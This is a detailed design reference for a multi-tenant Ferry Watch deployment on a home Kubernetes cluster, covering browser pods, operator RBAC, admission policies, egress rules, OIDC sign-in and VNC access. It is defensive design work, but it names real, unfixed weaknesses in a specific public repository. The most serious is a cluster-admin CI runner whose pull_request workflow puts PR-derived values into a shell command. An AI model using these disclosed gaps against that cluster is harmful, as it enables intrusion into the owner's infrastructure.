# Ferry Watch multi-tenant: design reference

Status: revised design reference for the owner, after five adversarial reviews of the draft (security red
team, cluster feasibility, product/UX, delivery/scope, completeness), then revised again for the owner's
round-2 answers (identity by OIDC; guest checkout assumed, with no spike that tests it and only reversible
choices; sandbox and kernel hardening proposed as optional, pending the owner's confirmation, now Q1; no pre-cart
sign-in window in v1), corrected after three independent reviews of that revision, and revised again for the
owner's round-3 answers (a poll curve with one warm browser per user and short checks for other trips, public
HTTPS egress during holds, `one_factor` sign-in, a trip paused until "Did you book it?" is answered, and every
other round-2 question settled except the sandbox; rows 61-75 of Appendix D). Appendix D lists every change and why.
The owner's decisions in [decisions.md](decisions.md) are fixed; this document states what each one costs.
Code refs are `file:line` in this repo at commit 1cdfca9. Cluster refs are `path:line` in
`mchestr/home-cluster` at commit 0bff2f8 (paths under `kubernetes/apps/` unless stated). Research refs are
`[R:name]` for [research/&lt;name&gt;.md](research/). Upstream facts checked during the review are cited by file
(round 2: Authelia at tag v4.39.28, Envoy Gateway at v1.9.2).

---

## 1. Summary

### What we are building and why

Ferry Watch today is one container (`Dockerfile`, `entrypoint.sh`). In it, one Python process runs the
dashboard, the watch loop for every trip, a single shared Chromium and the alerting, and KasmVNC shows that
Chromium to whoever reaches `/vnc`. That works for one person. It does not isolate tenants. Every trip shares
one unsandboxed Chromium (`site.py:154-157`, `site.py:167-176`), the BC Ferries password sits in the same
process (`settings.py:40-42`), and the VNC view is always open and shared (`entrypoint.sh:20-26`).

We will run headed-browser pods, one per trip being checked, on the owner's cluster (Talos 1.13.10,
Kubernetes 1.36.5, Cilium 1.20.2, Envoy Gateway 1.9.2). Each user's nearest trip within 7 days gets a
**warm** browser that checks on a curve, from every 5 min a week out to every 30 s in the last 6 hours; their
other trips get a **short check** every 6 hours from a pod that starts, checks once and exits (owner, round 3;
the numbers are defined in `src/ferry_watch/polling.py`). A small operator decides which pods exist and relays
typed status between pods and users. Alerts link users to a gated VNC view of their own trip's browser, and
only while that browser holds a cart. Access is invite-only: the dashboard signs people in itself with
OpenID Connect against the Authelia instance the owner already runs (owner's round-2 answer to first-list Q0), with
per-user limits and an admin page. The single-container mode is retired (owner decision 5).

### Terms, and which part is "the operator"

The owner asked for "an operator to spin up a headed browser for each route we are watching … and no way to
get secrets out of them from the main operator pod". This is how those words map onto the design:

| Owner's words | In this plan | What it is |
|---|---|---|
| "the operator", "the main operator pod" | **`ferry-control`** | One Deployment. Its *fleet loop* creates and deletes browser pods; its *hub endpoint* is the only thing browser pods talk to. |
| "headed browser for each route" | **browser pod** `fw-<trip>-g<gen>` | One pod per trip being checked: a long-lived *warm* pod for the user's nearest trip within 7 days, or a short-lived *short-check* pod for any other trip (§6.6). Chromium, Xvnc, and the **agent** (today's watcher, run for one trip). |
| "watched route" | **trip** | Route + date + party: today's `Trip` (`models.py:204-258`). A round trip is two trips. The owner's "number of watched routes per user" is `maxTrips` (saved, default 3) and `maxActiveBrowsers` (warm browsers at once, default 1), §8.2. |
| "link alerts to … the vnc" | **`/c/<trip>`** on the dashboard, then **`vnc-edge`** | The dashboard deep link opens checkout; vnc-edge is a static nginx that serves the KasmVNC client and forwards WebSocket upgrades to the pod. |
| "the dashboard" | **`ferry-web`** | Internet-facing UI and API. Mints VNC tickets. Has no Kubernetes rights and no route to pods. |

**What the operator (`ferry-control`) can do:** create and delete browser pods of exactly one admitted shape
in one namespace; change exactly one label on them (`ferry-watch.io/egress`, which opens public HTTPS
egress while a cart is held, §7.6); check pod identities with TokenReview; read the nodes list; receive typed
status from agents (phase, sailings, cart summary, error *classes*); grant or refuse a pod's request to cart
(one hold per user); send typed commands (`check_now`, `release`, `dismiss`, `drain`, `vnc_revoke`); read and
write its own database tables.

**What it cannot do:** read any Secret; exec, attach, port-forward, read logs of, or proxy to any pod; see
page content, screenshots, keystrokes, cookies or the guest cart session; steer the browser to a URL or run
JavaScript in it; mint a VNC ticket; be reached from the internet. These are enforced by RBAC (§7.3), the
agent protocol (§5.3) and admission (§7.5), each tested in CI (§11.5).

### How each user reaches their own pod

See §3.3. In one line: one static host `ferry-checkout.chestr.dev`, one path per pod
(`/t/<trip>/g/<gen>/`), vnc-edge proxies that path to that pod's own DNS name, and the pod admits only a
ticket bound to its own owner, trip, pod and cart. Two people checking out at once use two different paths to
two different pods.

### The load-bearing ideas

1. **No BC Ferries secret exists anywhere by default.** Guest carting already works; only the credential
   gate at `watcher.py:459`/`:562` blocks it. Guest checkout is **assumed to work** (owner, round 2: no
   spike); production detection and a fleet-wide alert-only switch cover the case where it doesn't, and
   every guest-related choice stays reversible (§5.7). A pod holds only a guest cart cookie, plus what the
   user types over VNC during one hold, and is destroyed after any viewed hold.
2. **Only the operator can create pods, it admits one pinned shape, and it has no internet ingress.**
   `ferry-control` is reachable only from browser pods (and Prometheus). Its RBAC is `pods` in one namespace.
   A GitOps-owned ValidatingAdmissionPolicy (VAP) admits only one exact, digest-pinned pod shape. The
   internet-facing `ferry-web` has no Kubernetes rights at all.
3. **Two control processes from one image, with disjoint reachability and secrets.** `ferry-web` faces the
   internet and holds the VNC ticket key and the VAPID key. `ferry-control` faces only browser pods and holds
   `pods` and `tokenreviews` rights. They share nothing but Postgres, each under its own DB role.
4. **The fat agent owns the cart.** Today's `Watcher`, run for one trip, keeps cart state, hold timers,
   back-off and the VNC gate inside the pod, clamped to compiled maxima. Restarts, upgrades and outages of
   the control plane never touch a cart.
5. **VNC never passes through control-plane code, and the pod decides.** The pod admits a viewer only with a
   60-second Ed25519 ticket minted by `ferry-web` and bound to that pod's owner, trip, pod and cart, then
   locks the hold to that first viewer's device. Xvnc listens only on a unix socket, which page JavaScript
   cannot open by construction.
6. **Egress is an allowlist enforced below the browser, opened to public HTTPS only while a cart is held.**
   Outside holds a Cilium `toFQDNs` policy with a DNS L7 rule lets browser pods reach only bcferries.com,
   Queue-it and `ferry-control`. While a cart is held, ferry-control flips one pod label and a second policy
   adds any public address on TCP 443, so any bank's 3-D Secure (3DS) page works (owner, round 3); private,
   cluster, node, metadata, smtp-relay and observability destinations stay denied always (§7.6). Chromium
   runs in kiosk mode with managed policies. Startup self-tests fail closed.
7. **The shared home IP is used sparingly, and budgeted where an honest agent can't bypass it.** The poll
   curve (owner, round 3) checks a trip rarely while its sailing is far off and often only when it is close:
   typically 2-5 checks/min for the whole fleet, about 14/min in the worst case. Above the 20/min budget
   `ferry-control` stretches every interval proportionally; each agent enforces its interval locally with a
   compiled 30 s floor and slows down (never speeds up) when it loses the operator. A persisted brake and a
   markup breaker protect the IP. A pod running attacker code (A3) can bypass all of this toward the hosts its
   policy allows; that residual is R13 (§4.6).
8. **Isolation is proven before anyone outside the household is invited.** CI blocks on a VAP leak-vector
   denial matrix and `kubectl auth can-i` negatives against a real apiserver. The egress matrix runs as a
   post-deploy smoke test on the home cluster, the only place Cilium's FQDN and SNAT behaviour can be proven;
   the operator stays in maintenance mode until it passes.
9. **Identity is app-native OIDC with a cookie-less app session.** ferry-web is an OIDC client of Authelia's
   existing provider and verifies the signed `id_token` itself; it then issues its own opaque bearer token,
   which the SPA keeps and sends in `Authorization`, and re-verifies each session with the IdP every 24 h. The app sets no cookie, so the dashboard route drops
   every Cookie header and the owner's `chestr.dev` Authelia cookie never reaches the app, with no
   gateway-wide Lua and no new domain. Issuer, client and claims are config; replacing the IdP is a
   documented runbook (§6.2.6).

### What it costs

- **Deployed components: 3** (`ferry-web` and `ferry-control` from one `ferry-watch-control` image, plus
  `vnc-edge`) plus the browser pods. Postgres comes from the shared CNPG `postgres17`. No CRDs.
- **Memory:** about 1-1.5 GiB per running browser including the in-memory `/tmp` and `/dev/shm`, against
  35-80 MB per extra context today [R:map-k8s-research §g]. With one warm browser per user and one slot kept
  for short checks, the owner's 8-24 GiB budget serves 3-22 users within 7 days of a sailing at once,
  depending on measured pod size, plus short checks for everyone else (§8.4).
- **Effort:** about 18-22 focused weeks (90-111 days) for one developer to reach invitees outside the
  household, of which the owner is on the new stack after about 14.5-18. The arithmetic is in §12.3. Round 3
  added the poll curve and short checks (2-2.5 days) and hold egress (2-2.5, including the pod-lock VAP moved
  forward from the old M3), and removed S-3DS, the runner work and the database variant; the old M3 is merged
  into M2.
- **What the owner gives up:** logged-in checkout with saved cards and account-only fares (guest only,
  accepted "for now"; reversible, and the legacy app stays restorable until guest checkout has worked, §5.7,
  §12.5); Chromium runs `--no-sandbox` unless the owner applies the optional Talos hardening (R2, Q1); holds
  released by Talos upgrades in v1 (§7.8); a tenant can browse other sites from the home IP during their own
  hold (R22).

### Which design we started from, and why

We started from **ops-scale-fairness**, the only one of the four designs written against the verified
cluster facts (shared CNPG Postgres, envoy-external, one single-label VNC host, Cookie stripping, no Pushover
for users, the browser namespace outside `components/common`, Fluent Bit/descheduler/Alertmanager
integration), cut to **lean-home-cluster's scope** (static VNC router, static interval stretching, no Standby
tier, SIGTERM drain, alert-only fallback), with security controls grafted from security-maximal and
k8s-native. The review then:
- merged hub and fleet into one operator process (as the owner described it) and moved identity to
  Authelia trusted headers, per owner decision 7 (then, after the owner's round-2 "Can we use oidc?", to
  app-native OIDC with a cookie-less session, §6.2);
- dropped the anchor ConfigMap and hold PDBs, which do not fit Talos's drain;
- set one active browser per user (owner decision during review; in round 3 that browser became the warm
  browser for the user's nearest trip, with short checks for the rest);
- fixed DNS, seccomp, memory accounting, the VNC reconnect path and several checkout-losing UX defaults;
- re-baselined the effort.

---

## 2. Owner decisions and assumptions

### 2.1 Owner decisions: how each is honoured and what it costs

| # | Decision | How this plan honours it | Honest cost |
|---|---|---|---|
| 1 | Operator plus one headed pod per watched route; the operator can't get secrets out | One pinned bare pod per trip being checked (warm or short check), created only by `ferry-control`, admitted by a VAP that forbids every secret-bearing field. The agent dials out, and its typed protocol has no page-content operations. No control-plane process is in the VNC data path. The VNC data path does cross Cloudflare, Envoy and vnc-edge in plaintext; see §4.3. | About 1-1.5 GiB per trip (§8.4). Every pod start is a fresh form walk and a possible Queue-it wait. The VAP and RBAC must stay correct forever; CI enforces this. |
| 2 | Alerts link to the trip's VNC | Cart alerts link to `https://ferry.chestr.dev/c/<trip>`. That page shows the held sailing and two choices: "Check out on this device" (mints a ticket and opens VNC) or "I'll use my computer". | One extra tap, because a bearer VNC URL in a notification would hand VNC power to whoever sends the notification, and an automatic open would lock checkout to whichever device opened the link first. |
| 3 | VNC only while a cart is held | Enforced in the pod (authoritative), by ferry-web (won't mint a ticket), by ferry-control (deletes the pod at hold cap + 5 min on its own clock), by Xvnc `-MaxConnectionTime`, and by `activeDeadlineSeconds`. | No "watch my browser" view. No pre-cart sign-in window in v1 (owner, round 2: first-list Q1, "No"); adding one later needs the owner's explicit decision and real work (§15). |
| 4 | Invite-only; an admin approves each account | Three gates: Authelia issues sign-in codes for the `ferry-watch` client only to lldap groups `ferry-watch` and `admin` (an OIDC authorization policy, default deny); the app admits only people the admin invited on the Users page (§6.2.7); suspension revokes every session at once. Authelia checks the group when it issues a code, so the app re-verifies every session with it at least every 24 h (§6.2.2). | lldap users are still created by hand on a LAN-only UI, with no remote password reset [R:cluster-identity-security "lldap"]. The `ferry-watch` client is `one_factor` (owner, round 3): invitees sign in with the password the owner gives them, so no second-factor enrolment; each invitee's email must still be deliverable through SES for the invitation and alerts (§2.3). Removing someone in lldap reaches the app within 24 h, not at once, so the removal runbook suspends them in the app first (R20, §12.5). |
| 5 | Operator-only | `entrypoint.sh` and the standalone image are retired. Local dev uses docker compose; chart work uses kind. | The owner's `config.json`/`alerted.json` need a one-time import (§12.5). |
| 6 | Ko-fi link, no payments | A `kofiUrl` Helm value validated as `https://ko-fi.com/<name>`, rendered as a plain `<a>`. The CSP (`server.py:232-251`) is unchanged. | None worth noting. |
| 7 | Start with Authelia and trusted headers; easy to replace; don't depend on Authelia. **Round 2: "Can we use oidc?"** | ferry-web is an OIDC Relying Party of Authelia's existing provider (confidential client, Authorization Code + PKCE S256) and verifies the `id_token` itself. It then issues its own opaque bearer token (no cookies), so the dashboard route has no gateway auth and drops every Cookie header. Identity sits behind an `IdentityProvider` interface; issuer, client and claim names are config; user ids are `hash(iss, sub)`. No Authelia-only feature is load-bearing. §6.2 gives the design, the alternatives and the replacement runbook. | About 3-4 more focused days than the header adapter (§12.3). The session token sits in localStorage, readable by any XSS on the dashboard origin (R17); unauthenticated requests now reach ferry-web (R19); the iOS home-screen redirect path needs a check on the owner's iPhone (R18); IdP changes reach the app at the next 24-hourly re-verification, not on every request (R20); Authelia's `sub` follows the username (R21). The VNC host cannot use the IdP, so ownership is checked cryptographically in the pod (D7). |
| 8 | Per-user limits on watched routes | `maxTrips` 3 saved, `maxActiveBrowsers` 1 warm browser (owner, during review), both admin-configurable per user and clamped by GitOps ceilings, enforced in five layers (§9). The warm browser goes automatically to the nearest trip within 7 days; the others get short checks (round 3). | A small admin Users page and a limits resolver. |
| 9 | Reap unused browsers; no misuse | Disposable pods (`restartPolicy: Never`), recycled after every viewed hold and at about 24 h; short-check pods exit after one check; hold caps, kiosk mode, policies and the egress allowlist outside holds. | More pod starts mean more Queue-it visits, which the start throttle and budget (D12) absorb. |
| Alerts | No Pushover; Web Push plus email | ferry-web sends from a Postgres outbox. Web Push is the default; email carries cart alerts and is the fallback. | A service worker, VAPID handling and SES production access (§2.3). |
| Routing (review) | "Route each user to their own pod" | §3.3: one host, one path per pod, one ticket per owner, trip, pod and cart. | None beyond vnc-edge. |
| Polling (round 3) | "Be good users of the api": poll rarely when far off, often when close; trips at most 30 days ahead; quiet hours alert only | One warm browser per user on a curve (5 min from 7 days out, 2 min from 3 days, 60 s from 24 h, 30 s from 6 h; ±15 % jitter; 30 s compiled floor), short checks every 6 h for other trips, `tripHorizonDays` 30, quiet hours 23:00-06:00 Pacific alert only (since 0.6.3: each user's own, none by default, and no checks at all in them). Canonical: `src/ferry_watch/polling.py`; §6.6, §8.2, §9.3. | A trip that isn't the user's nearest is seen only every 6 h until it becomes the nearest; each short check is a pod start and possibly a Queue-it pass. |
| 3DS egress (round 3) | Open public HTTPS egress while a cart is held | A second CiliumNetworkPolicy selects `ferry-watch.io/egress: hold`, a label only ferry-control may change, and only that label (VAP); private, cluster, node, metadata, smtp-relay and observability destinations stay denied (§7.6). | A tenant can browse other sites from the home IP during their own hold, and code in a holding pod can reach any public HTTPS host (R22). ferry-control gains `pods` patch, fenced by the pod-lock VAP from M1. |

### 2.2 Cluster facts this plan relies on (verified in home-cluster at 0bff2f8 unless marked upstream)

| Fact | Consequence in this plan |
|---|---|
| Kubernetes 1.36.5: VAP GA (CONNECT matching to be confirmed in S-TR), TokenReview returns pod-name/pod-uid extras, `hostUsers` GA. | VAPs are the admission layer and TokenReview binds agents. If VAP CONNECT doesn't work, exec/attach/portforward rely on RBAC alone (noted). |
| Cilium 1.20.2, native routing, netkit, BPF masquerade, kube-proxy replacement (`kube-system/cilium/app/resources/values.yaml:1-50`). `toFQDNs` and the DNS proxy are unused here. | Egress uses `toFQDNs` plus a DNS L7 rule, verified live in S-CIL. Fallback: today's `toCIDRSet`. |
| Cilium's DNS proxy answers **REFUSED** for names a policy does not allow (upstream `Documentation/security/policy/layer7.rst`, "DNS Refused"); no override here. glibc stops walking the search list on REFUSED and then tries the name as typed (upstream `resolv/res_query.c` search loop). | A short name such as `ferry-hub.ferry-watch.svc` never resolves. Fix: home-cluster sets `dnsProxy.dnsRejectResponseCode: nameError` (no DNS rules exist today, so nothing regresses), and every in-cluster name in config is fully qualified (§7.6). |
| Hubble is on through the HelmRelease values (`kube-system/cilium/app/helmrelease.yaml:28-49`), overriding `values.yaml:33`. | Hubble-based checks in S-CIL and the post-deploy smoke are feasible. The control plane cannot read Hubble (no egress to observability). |
| Cross-node Envoy→pod traffic is SNATed to the `kube-apiserver` entity [R:cluster-networking "Cross-node SNAT quirk"]. | NetworkPolicy cannot prove a request came from the gateway. In-pod checks are cryptographic. No app identity holds `pods/proxy` or `services/proxy`. |
| envoy-external has no auth. envoy-internal has a gateway-wide `SecurityPolicy internal-secure` using Authelia ext-authz with `headersToBackend: Remote-User/Groups/Name/Email` (`networking/envoy-gateway/app/envoy.yaml:122-151`). Authelia's ReferenceGrant admits SecurityPolicies only from `networking` (`default/authelia/app/referencegrant.yaml:5-14`). | The dashboard follows the envoy-external convention: the app does its own OIDC (§6.2). No SecurityPolicy, no ReferenceGrant change, no Authelia `access_control` rule for ferry hosts. |
| Envoy Gateway runs Lua only if `extensionApis.enableLua: true` (upstream EG v1.9 `tasks/extensibility/lua.md`); it is not set here (`networking/envoy-gateway/app/helmrelease.yaml:14-20`). | The draft's Lua cookie filter would need a gateway-wide change. It is not needed: the app sets no cookie, so the route removes the whole Cookie header (§6.2.3). |
| The EnvoyProxy sets no access log (`envoy.yaml:19-43`), so Envoy Gateway's default stdout access log applies and records request paths. | No secret ever appears in a path or query string (C15). |
| Authelia: session cookie `authelia-home-ops` on `chestr.dev`, 3 d inactivity, 7 d expiry, 6 months with remember-me (`default/authelia/app/resources/configuration.yaml:32-41`); `default_policy: two_factor`, last rule denies `*.chestr.dev` (`:45-104`); 3 failures in 1 h ban for 1 day (`:27-30`); password reset disabled (`:23-24`); every OIDC client is `two_factor` with no `authorization_policies` (`:131-214`). | The `ferry-watch` OIDC client gets its own `authorization_policies` entry (groups `ferry-watch` and `admin`, default deny) at `one_factor` (owner, round 3): invitees sign in with their password only, so there is no second-factor enrolment and no enrolment email. A one-factor Authelia session does not satisfy the other clients' `two_factor`. Access-control rules do not apply to OIDC authorizations, and no ferry host is behind forward-auth, so no rule is added. Existing clients are restricted to their own groups before anyone new joins lldap (hard gate). |
| Authelia's OIDC clients here use `require_pkce: true`, `pkce_challenge_method: S256`, `pre_configured_consent_duration: 1y` and `claims_policy: default`, which puts `groups`, `email`, `email_verified`, `preferred_username` and `name` in the `id_token` (`configuration.yaml:123-127`, `:131-214`). Client id, secret and argon2 hash live in the 1Password item `authelia` (`default/authelia/app/README.md`); Authelia reads the hash (`default/authelia/app/externalsecret.yaml`) and each consumer reads id and secret through its own ExternalSecret (`observability/grafana/instance/externalsecret.yaml:20-38`). Authelia's route is on envoy-external (`default/authelia/app/helmrelease.yaml:147-153`). Upstream v4.39.28: `sub` is an opaque UUID created on first use **per username** and reused for that username (`internal/oidc/store.go:76-101`, `GetSubject`/`GenerateOpaqueUserID`); the client's authorization policy, and the refresh of the user from LDAP (`refresh_interval: 1m`, `configuration.yaml:25`), are applied only when Authelia handles an authorization request (`internal/handlers/handler_oauth2_authorization_consent_core.go:35-80`); `prompt=none` answers `login_required` or `consent_required` (`internal/handlers/handler_oauth2_authorization.go:122-127`, `handler_oauth2_authorization_consent_preconfigured.go:132-138`); pre-configured consent holds only for identical scopes (`clients.md`, `pre_configured_consent_duration`); `response_modes` may list `fragment` (`internal/configuration/validator/identity_providers.go:1153-1189`). | ferry-web registers as one more client in the same pattern (§6.2.3) and always requests the same scopes. A uid is known only after a person's first sign-in, so invitations bind at first sign-in (§6.2.7). A reused lldap username would inherit the old person's `sub` and uid, so usernames are never reused (R21). Group removal reaches the app only when the session next goes back to Authelia, so sessions are re-verified every 24 h (§6.2.2, R20). The code comes back in the URL fragment, so it never reaches an access log (C15; runtime acceptance with `response_type=code` is checked in S-OIDC). ferry-web's egress to the issuer goes to the envoy-external pods (§7.6). |
| `*.chestr.dev` reaches envoy-external through a Cloudflare tunnel (`networking/cloudflared/app/resources/config.yaml:5-11`). | Cloudflare's edge and cloudflared see plaintext HTTP and WebSocket frames, including VNC keystrokes (§4.3, R4). |
| Only single-label `*.chestr.dev` is covered by the cert and the tunnel. external-dns (Cloudflare: `--gateway-name=envoy-external`, `networking/external-dns/cloudflare/helmrelease.yaml:31-38`; UniFi: all HTTPRoutes, `unifi/helmrelease.yaml:48`) and gatus (`--auto-httproute`, `observability/gatus/app/helmrelease.yaml:25`) react to every HTTPRoute. HTTPS listeners accept routes from any namespace. | Two static hosts, `ferry.chestr.dev` and `ferry-checkout.chestr.dev`. No app identity writes HTTPRoutes. Before cutover the dashboard runs on `ferry-next.chestr.dev` (§12.5). |
| `components/common` injects the Flux GitHub token, registry credentials and cluster-secrets. `default` has privileged pods and Authelia's Dragonfly. | The browser namespace is created by the chart without `components/common`, and is never `default`. |
| CNPG `postgres17` with 30-day PITR to R2 (`database/cloudnative-pg/cluster/cluster17.yaml`). `components/cnpg` copies the shared superuser password into `${APP}-initdb-secret` in the app namespace (`components/cnpg/externalsecret.yaml:21-23`) and adds a 4-hourly pg_dump CronJob (`components/cnpg/cronjob.yaml`). 15 apps use it; none uses CNPG managed roles. | DB `ferrywatch`. The superuser is used only by the stock `postgres-init` image, never by our image (§6.4). Per-process login roles come from CNPG managed roles. The resident superuser Secret is residual R14, accepted permanently (owner, round 3: keep the standard component). |
| talosctl 1.13's drain uses `Force: true` and a 5-minute default timeout; on timeout the upgrade fails without rebooting and leaves the node cordoned (upstream `cmd/talosctl/pkg/talos/nodedrain/nodedrain.go:30,86`; `cmd/talosctl/cmd/talos/upgrade.go:148-162`). tuppr passes `--drain-timeout` only if `policy.drainTimeout` is set (upstream tuppr `internal/controller/talosupgrade/jobs.go:600-601`); here it is not (`system-upgrade/tuppr/upgrades/talos.yaml:10-11`). | Bare pods drain without any controller ownerReference, so there is no anchor ConfigMap. A hold PDB would fail the upgrade rather than delay it, so v1 has none (§7.8). |
| containerd's RuntimeDefault seccomp profile allows `clone` with namespace flags, `unshare` and `setns` only with `CAP_SYS_ADMIN` (upstream `contrib/seccomp/seccomp_default.go:692-718,820-860`); the kubelet applies it by default (`talos/controlplane.yaml:24`); Talos KSPP sets `user.max_user_namespaces=0`. | Chromium's namespace sandbox needs a Localhost seccomp profile **and** the sysctl, both Talos machine-config changes (S-SBX, optional hardening in the backlog; R2). |
| descheduler runs LowNodeUtilization with `evictLocalStoragePods: true` (`kube-system/descheduler/app/helmrelease.yaml:30,51`); its default evictor skips pods without ownerReferences (upstream v0.37 `defaultevictor.go:239-240`). | Bare browser pods are skipped by design; the namespace exclusion is a second layer. |
| Fluent Bit ships every pod's logs to VictoriaLogs, unauthenticated in-cluster. Stock alerts page the owner on Pushover. | The browser namespace is excluded from Fluent Bit and its stock alerts are silenced. |
| smtp-relay (maddy to SES) at `smtp-relay.default:2525` admits only Authelia and lldap. | One home-cluster NetworkPolicy rule admits `ferry-web` only. |
| Multus (macvlan `multus-iot`) is installed. | The VAP denies the `k8s.v1.cni.cncf.io/networks` annotation. |
| Talos kernel args are `apparmor=0 security=none mitigations=off` (`talos/schematic.yaml:6,11,12`), on Intel nodes (`:9,17`). All three nodes are control-plane nodes that also run workloads (`talos/controlplane.yaml:191`, `allowSchedulingOnControlPlanes: true`). | A risk-acceptance choice, not a functional requirement, explained in plain terms in R2, including what a kernel escape reaches here (node root next to etcd and the API server). Changing the flags, and enabling Chromium's sandbox, is proposed as optional hardening, recommended before inviting people the owner doesn't know well, and not a gate. That is the planner's recommendation; the owner asked why it was needed and has not yet decided (Q1). |
| A self-hosted GitHub runner `home-cluster-runner` has `cluster-admin` and Talos `os:admin` (`actions-runner-system/actions-runner-controller/runners/home-cluster/rbac.yaml:9-25`, `talos/controlplane.yaml:85-88`) and runs a `pull_request` workflow that interpolates PR-derived values into a shell command (`.github/workflows/image-pull.yaml:5-7,95-109`). | Left as is (owner, round 3); a residual stated to tenants (R1). Not a gate. |
| The ClientTrafficPolicy trusts XFF from 10.42/16, but pods are on 10.244/16. | Envoy's idea of the client address is not usable. After sign-in, rate limits are per user. Before sign-in they key on `CF-Connecting-IP`, which Cloudflare's edge sets (a request reaching envoy-external from the LAN can forge it, so a global ceiling stays as the backstop; §6.3, R19). |
| Cloudflare geo-blocks every country except CA/US/CN; Rocket Loader and email obfuscation are zone-wide. | Unchanged (owner, round 3): invitees must be in Canada or the US (CN is irrelevant to them), including when travelling, and the invitation and onboarding say so. A Cloudflare rule turns both features off for the ferry hosts. |
| The current deployment `default/ferry-watch` reads `BCF_USER`/`BCF_PASS` from 1Password item `ferry-watch` and the `pushover` item (`default/ferry-watch/app/externalsecret.yaml:14-23`); `pushover` is also used by kube-prometheus-stack, gatus, sonarr, radarr and qbittorrent. The Kustomization prunes (`default/ferry-watch/ks.yaml:26`) and includes the VolSync component. | The cutover keeps the legacy app scaled to zero with its PVC and the BC Ferries fields until a real guest checkout has worked on the new stack (not after a fixed time), removes only ferry-watch's *reference* to `pushover`, and only then deletes the BC Ferries fields (§12.5). The legacy app is today's only logged-in checkout path. |

### 2.3 Prerequisites, with fallbacks if a feature is missing

| Prerequisite | Who | Needed by | Fallback if missing |
|---|---|---|---|
| Cilium `dnsProxy.dnsRejectResponseCode: nameError` | home-cluster | W0 (S-CIL) | Add `*.svc.cluster.local`-style patterns to every DNS rule and keep fully qualified names. |
| Cilium DNS proxy works for `toFQDNs` (S-CIL) | spike | M1 | `toCIDRSet` 0.0.0.0/0 minus private, CGNAT and link-local ranges (today's rule) on 443 at all times, which is the "open always" option of §7.6. |
| Cilium re-applies policy within seconds when ferry-control changes a running pod's `ferry-watch.io/egress` label, and the allowlist connections survive the change (S-CIL) | spike | M1 | Public HTTPS egress always, relying on VNC existing only during holds (the "open always" option and its trade-off, §7.6). |
| Authelia OIDC client for Ferry Watch (confidential, PKCE S256, scopes `openid profile email groups`, `response_modes: [fragment]`, redirect URIs on `ferry.chestr.dev` and, until cutover, `ferry-next.chestr.dev`, `claims_policy: default`, pre-configured consent 1y) plus an `authorization_policies` entry `ferry-watch` (groups `ferry-watch` and `admin` at `one_factor`, owner round 3; default deny); id, secret and hash generated with the `default/authelia/app/README.md` script (`APP=FERRY_WATCH`) | owner + home-cluster | M1 (S-OIDC in W0) | If Authelia refuses `response_mode=fragment` with `response_type=code` at runtime: `query` mode, with the code in Envoy's access log stated as an exception to C15 (single use, 1-minute lifespan, useless without the PKCE verifier; the client secret is no extra barrier, because `/auth/session` exchanges any posted code and verifier with ferry-web's own secret). Otherwise none needed: it is the cluster's usual client pattern. |
| Authelia OIDC `authorization_policies` restricting Immich, Windmill, Grafana, Autobrr and Paperless to their groups; lldap group `ferry-watch` | home-cluster | **before any new person is added to lldap** | none (hard gate on M2) |
| Each invitee's email deliverable through SES (production access, or the invitee verified as an SES identity first) | owner | before each invitee is created | The owner sends the invitation by hand; cart alerts then go by push only, which iOS can silence. (No enrolment email is needed: the client is `one_factor`.) |
| CNPG managed roles `ferrywatch_web` and `ferrywatch_control` on `postgres17`, with password ExternalSecrets in `database` | home-cluster | M1 | One login role for both processes, as a stated weakening of C24 until fixed. |
| 1Password fields. Item `ferry-watch`: VNC ticket Ed25519 private key, VAPID private key. Item `authelia`: `FERRY_WATCH_OAUTH_CLIENT_ID`, `FERRY_WATCH_OAUTH_CLIENT_SECRET`, `FERRY_WATCH_OAUTH_CLIENT_SECRET_HASH`. Item `cloudnative-pg`: `ferrywatch_postgres_{username,password}`, `ferrywatch_web_password`, `ferrywatch_control_password`. | owner | M1 | none |
| *Optional (backlog), not a prerequisite:* Talos `user.max_user_namespaces` sysctl **and** a `machine.seccompProfiles` Localhost profile, applied per node (S-SBX) | owner (`task talos:apply-node`), if and when they choose (Q1) | — (recommended before inviting people the owner doesn't know well) | `--no-sandbox` stays (R2). Not a gate unless the owner makes it one. |
| Measured browser memory (S-MEM) | spike | M1 | Start at `browserMemoryBudget: 12Gi`, `podMemory: 1.5Gi`, so `maxBrowsersTotal = 7` (§8.4). |

Removed in round 3: restricting `home-cluster-runner` (left as is, R1) and the multi-issuer 3DS learning run
(S-3DS; hold egress replaces the 3DS allowlist).

---
## 3. Architecture

### 3.1 Components

| Component | Kind / image | Reachable from | Kubernetes RBAC | Secrets it holds | Job |
|---|---|---|---|---|---|
| `ferry-web` | Deployment, 1 replica, Recreate; `ferry-watch-control web` | envoy-external → `ferry.chestr.dev` on :8765 (no gateway auth; every Cookie header removed); Prometheus on :9090 | **none** (no SA token mounted) | VNC ticket signing key, VAPID key, OIDC client secret, `ferrywatch_web` DB password | OIDC sign-in and app sessions, dashboard, user and admin API, per-user WebSocket hub, VNC ticket minting, notification outbox sender (Web Push, email) |
| `ferry-control` (**the operator**) | Deployment, 1 replica, Recreate; `ferry-watch-control control` | browser pods only, on :8766; Prometheus on :9090 | ClusterRole `tokenreviews` create; Role in `ferry-watch-browsers`: `pods` create/delete/get/list/watch/patch (patch limited by VAP to the one egress label); ClusterRole `nodes` get/list/watch | `ferrywatch_control` DB password | **hub endpoint:** agent WebSocket, TokenReview binding, agent state to Postgres, commands and `configure` to agents, cart claims (one hold per user), poll curve, budget and brake. **fleet loop:** warm-trip selection, short-check schedule, admission and queue, reconcile pods, hold-egress label, timers, reaper, cordon handling, maintenance gate |
| `vnc-edge` | Deployment, 2 replicas; `ferry-watch-vnc-edge` (nginx-unprivileged, the stock KasmVNC web client, a landing page and a small WebSocket shim) | envoy-external → `ferry-checkout.chestr.dev` on :8080 | none | none | serves the static client; proxies only WS upgrades on `/t/<trip>/g/<gen>/ws` to that pod |
| browser pods `fw-<trip>-g<gen>` | bare Pods; `ferry-watch-browser` | vnc-edge → :6080; kubelet → :8080 | none (no API token) | guest cart cookie; what the user types during one hold | the agent (one-trip Watcher, gate, supervisor), Xvnc, matchbox, Chromium |
| `ferry-watch-db-init` | Helm pre-install/pre-upgrade Job; stock `ghcr.io/home-operations/postgres-init` (the image 15 cluster apps use) | nothing | none | **the CNPG superuser** (from `ferrywatch-initdb-secret`) | creates database `ferrywatch` and owner role `ferrywatch` (idempotent) |
| `ferry-watch-db-migrate` | Helm pre-install/pre-upgrade Job (after db-init); `ferry-watch-control migrate` | nothing | none | owner role `ferrywatch` password | SQL migrations, grants to `ferrywatch_web`/`ferrywatch_control`, RLS and triggers |
